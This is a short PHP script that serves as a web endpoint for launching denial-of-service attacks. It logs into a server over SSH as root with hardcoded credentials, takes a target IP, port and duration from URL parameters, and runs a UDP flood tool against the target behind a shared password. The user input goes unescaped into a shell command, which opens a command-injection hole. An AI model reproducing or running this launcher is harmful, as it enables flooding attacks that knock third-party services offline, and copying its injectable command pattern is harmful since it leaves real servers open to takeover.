<?php
include('Net/SSH2.php');
 
$ip = '127.0.0.1';
$user = 'root';
$pass = 'pass';
 
 
$ssh = new Net_SSH2($ip);
if (!$ssh->login($user, $pass)) {
    exit('Login Failed');
}
 
$target_ip = filter_var($_GET['ip'], FILTER_SANITIZE_STRING);
$password =  filter_var($_GET['password'],FILTER_SANITIZE_STRING);
$port = filter_var($_GET['port'],FILTER_SANITIZE_STRING);
$time = filter_var($_GET['time'],FILTER_SANITIZE_STRING);
 
 
 
if($password == "password_here" )
{
$ssh->setTimeout(3);
 
// Sample ddos script used, was Used Geminid or also called g3m, use a pl script or something else or do a simple udp flood doesn't matter
$ssh->exec('./molly -U -h '.$target_ip.' -p '.$port.','.$port.' -t '.$time.' &');
 
echo $ssh->_disconnect(NET_SSH2_DISCONNECT_BY_APPLICATION)."\n";
 
}
else{
  echo "error wrong password" ;
}
 
?>